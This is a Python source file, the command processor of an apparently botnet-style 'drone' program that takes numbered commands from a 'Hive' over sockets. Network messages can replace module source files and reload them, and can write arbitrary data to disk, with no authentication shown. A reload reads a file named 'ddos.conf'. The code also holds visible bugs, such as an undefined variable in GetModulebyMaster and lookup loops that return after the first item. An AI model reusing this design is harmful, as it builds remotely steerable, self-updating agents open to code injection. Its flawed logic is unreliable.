# encoding: iso-8859-1

#
# Copyright (C) 20011-2012 by Booksize
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the
# Free Software Foundation; either version 2 of the License, or (at your
# option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
# more details.
#
# You should have received a copy of the GNU General Public License along
# with this program. If not, see <http://www.gnu.org/licenses/>.
#

import time
# encoding: iso-8859-1
## The CommandProcessor

import SOCKS, CLI, FILEIO, LOG
import sys, os, commands, threading
from collections import deque

LOCK = threading.Lock()

#The FIFO-Buffer for incomming commands
class Fifo:
    def __init__(self):
        self.first_a= deque()
        self.first_b= deque()

    def append(self,data,handler):
        self.first_a.append(data)
        self.first_b.append(handler)

    def pop(self):
        try:
            return self.first_a.popleft(), self.first_b.popleft()
        except (IndexError):
            pass

    def hascontent(self):
        if (len(self.first_a) > 0):
            return True
        return False

class CP(object):
    _instance = None
    _lock = threading.Lock()

    def __init__(self):
        self.buffer = Fifo()
        self.sLog = LOG.sLog();

        #Installed Mods
        # 0 = Root of Module 
        # 1 = Module().Master()
        # 2 = Module().CLI_Dict()
        # 3 = Name
        self.installed_mods = []

        #TimedEvent
        # 0 = Timer
        # 1 = Module.Master().Event()
        self.installed_mods_timed_event = [] 

        self.Drone_Name = ""

        self.InitMods();
        self.ReadConfig();
        self.StartUP();

    #Load, Register and Start mods
    def InitMods(self):
        #MainRoutines
        self.m_Sock = SOCKS
        SOCKS.CP = self
        self.m_Sock_listen = self.m_Sock.Listener()
        self.m_Sock_listen.start()
        self.m_Sock.debug = False
        self.m_Sock_out = self.m_Sock.DroneUpdater(self)
        self.m_Sock_out.start()

        CLI.CP = self
        self.m_CLI = CLI.InputFromConsole()
        self.m_CLI.start()

        #UserMods
        self.m_args = FILEIO.FileIO().ReadLine("./configs/bird.conf")


        self.temp = self.m_args.split("\n")
        for str in self.temp:
            out = str.split("=")
            i=0
            for item in out:
                i=i+1
                if item.strip() == "droneid":
                    self.Drone_Name = out[i].strip()

                if item.strip() == "modules":
                    t_ip = out[i].split(",")
                    for item in t_ip:
                        self.m_CLI.writeline("Loading Mods: " + item.strip())
                        self.handler = __import__(item.strip())

                        #Woerterbuch suchen...
                        try:
                            self.mod_cli = self.handler.CLI_Dict()
                        except AttributeError:
                            self.mod_cli = "None"

                        self.installed_mods.append([self.handler,self.handler.Master(self), self.mod_cli, item.strip()])
                        self.sLog.outLog("Using Module:" + item.strip())


    ## Read the config
    def ReadConfig(self):
        self.m_args = FILEIO.FileIO().ReadLine("./configs/bird.conf");
        self.m_Sock_listen.config(self.m_args,self);

        ##send config to our mods
        #for item in self.installed_mods_master:
        for item in self.installed_mods:
            item[1].config(self.m_args, self);

    #Here we define our Startup-Setup
    def StartUP(self):
        self.m_Sock_out.writeline("001 10 " + self.Drone_Name)
        self.m_Sock_out.writeline("INIT")

        for item in self.installed_mods:
            item[1].start();

    ## Threads and Mods stop here
    def StopMods(self):
        #UserMods
        for item in self.installed_mods:
            item[1].stop()


        self.m_CLI.stop()
        self.m_Sock_listen.stop()
        self.m_Sock_out.stop()

    #################################################
    ####                EVENTS                   ####
    #################################################
    def InsertEvent(self,time,handler):
        self.installed_mods_timed_event.append([time, handler])
        sorted(self.installed_mods_timed_event, key=lambda timer: timer[0])
        return

    #Alert CLI
    def ToConsole(self,args):
        self.m_CLI.writeline(args)

    ## Alter Drones
    def ToSocket(self, args):
        self.m_Sock_out.writeline(args)

    def ToDrone(self, name, args):
        self.m_Sock_out.writeTo(name, args)

    #Put incomming cmds on buffer
    def command(self, args,handler):
        self.buffer.append(args,handler)

        #if LOCK.acquire(False): # Non-blocking -- return whether we got it
        #    LOCK.release()
        #else:
        #    self.sLog.outCritical("Couldn't get the lock. Maybe next time")

    def refresh(self):
        try:
            if (self.installed_mods_timed_event[0][0] <= time.time()):
                self.installed_mods_timed_event[0][1].Event()
                del (self.installed_mods_timed_event[0])
        except IndexError:
            pass

        while (self.buffer.hascontent() == True):
            args, handler = self.buffer.pop()

            # Dummy Mode
            if (handler == "NULL"):
                handler = self
                handler.ID = "NULL"

            if args == "TP":
                self.StopMods()
                return False

                #If we get a init from network
            if args == "INIT":
                self.ToSocket("001 10 " + self.Drone_Name) #Send our Name
                for item in self.installed_mods:
                    item[1].initfromdrone(args, handler)

            #Check if we've got an address instead of junk
            try:
                if (int(args.split(" ")[0]) == 1):
                    self.Internal_Commands(args)

                #module commandhandler
                for item in self.installed_mods:
                    item[1].command(args,handler)
            except ValueError:
                None

        return

            #Im Notfall wieder einbauen
            #if LOCK.acquire(False): # Non-blocking -- return whether we got it
                #LOCK.release()
            #else:
                #self.sLog.outCritical("Couldn't get the lock. Maybe next time")

    def GetModulebyName(self, name):
        for self.out in self.installed_mods:
            if (self.out[3] == name):
                return self.out
            return None

    def GetModulebyMaster(self, master):
        for self.out in self.installed_mods:
            if (self.out[1] == name):
                return self.out
            return None

    ##############################################
    # Addressline 001 fuer den internen Gebrauch #
    ##############################################

    def Internal_Commands(self,args):
        #List all Mods we are using
        if (args.split(" ")[1] == "1"):
            for self.out in self.installed_mods:
                 self.m_CLI.writeline(self.out[3])
            for self.out in self.installed_mods_timed_event:
                self.m_CLI.writeline(str(self.out[0]) + " " + str(self.out[1]))

        #Stop module X
        if (args.split(" ")[1] == "2"):
            self.i=0
            for self.out in self.installed_mods:
                if (self.out[3] == args.split(" ")[2]):
                    self.out[1].stop()
                self.i=self.i+1

        #Reload and Start Module X
        if (args.split(" ")[1] == "3"):
            self.out = self.GetModulebyName(args.split(" ")[2])
            self.ReloadMod(self.out)
            return

        #Push mod X to da Hive
        if (args.split(" ")[1]=="4"):
            self.out = self.GetModulebyName(args.split(" ")[2])
            self.SendModule(self.out)
            return

        #recive Module from Hive
        if (args.split(" ")[1]=="5"):
            self.out = self.GetModulebyName(args.split(" ")[2])

            if self.out == None:
                return

            if (float(args.split(" ")[3]) > float(self.out[0].m_version)):
                self.all = len(args.split(" ")[0]) + len(args.split(" ")[1]) + len(args.split(" ")[2]) + len(args.split(" ")[3]) + 4
                self.RecModule(self.out, args[self.all:])

        #Push all mods to da Hive
        if (args.split(" ")[1]=="6"):
            for self.out in self.installed_mods:
                self.SendModule(self.out)

        #List all Authed and Connected Drones
        if (args.split(" ")[1]=="7"):
            for self.out in self.m_Sock.DroneUpdater.KnownDrones_Name:
                self.m_CLI.writeline(self.out)

        #SendFile to Drone
        #Drone, Source, Target
        if (args.split(" ")[1]=="8"):
            FILEIO.FileIO(self).SendFile(args.split(" ")[3], args.split(" ")[4], args.split(" ")[2])

        #rec file
        #Flag, TargetName, Data
        if (args.split(" ")[1]=="9"):
            self.length = len(args.split(" ")[0]) + len(args.split(" ")[1]) + len(args.split(" ")[2]) + len(args.split(" ")[3]) + 4
            if (int(args.split(" ")[2]) == 0):
                FILEIO.FileIO().WriteToFileSync(args.split(" ")[3],args[self.length:],"wb")
            elif(int(args.split(" ")[2]) == 1):
                FILEIO.FileIO().WriteToFileSync(args.split(" ")[3],args[self.length:],"ab")
        #SubAddresse 10 liegt im Socket

    def ReloadMod(self,args):
        self.accessor = args[1]
        self.accessor.stop()

        try:
            self.accessor.join()
            self.handler = reload(self.installed_mods[self.installed_mods.index(args)][0])
        except AttributeError:
            self.handler = reload(self.installed_mods[self.installed_mods.index(args)][0])

        self.m_args = FILEIO.FileIO().ReadLine("./configs/ddos.conf")
        args[1] = self.handler.Master(self)
        args[1].config(self.m_args, self);
        args[1].start()
        self.sLog.outLog("Module reloaded: " + self.installed_mods[self.installed_mods.index(args)][3])

    def SendModule(self,args):
        self.name = str(args[3])
        self.rev = args[0].m_version
        self.str = FILEIO.FileIO().ReadLine(self.name + ".py")
        self.ToSocket("001 5 " + self.name + " "  + str(self.rev) + " " + self.str)

    def RecModule(self, entry, args):
        self.name = str(entry[3]) + ".py"
        try:
            FILEIO.FileIO().WriteToFileAsync(self.name, args, 'w')
            self.ReloadMod(entry)
            self.sLog.outLog("Recived newer Version of Module: " + self.name)
        except IOError:
            pass

    def GetDictionary(self,module, args):
        self.i=0
        for self.out in self.installed_mods:
            if (self.out[3] == module):
                try:
                    self.dict = self.out[2].get(args);
                    if (self.dict):
                        return self.dict
                except AttributeError:
                    self.m_CLI.writeline("This Module has no Commands!")

            self.i=self.i+1

